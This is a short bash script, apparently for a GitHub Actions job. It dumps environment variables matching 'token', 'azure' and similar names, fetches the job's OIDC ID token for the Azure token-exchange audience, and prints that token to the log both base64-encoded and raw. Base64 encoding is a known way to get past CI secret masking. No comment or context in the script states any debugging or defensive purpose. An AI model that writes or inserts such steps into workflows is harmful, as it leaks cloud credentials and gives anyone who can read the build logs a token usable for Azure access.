#!/usr/bin/env bash
set -x
env | sort | grep -iE "token|request|azure|id_" || true
REQ="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$REQ" | base64 -w0
echo
curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$REQ"
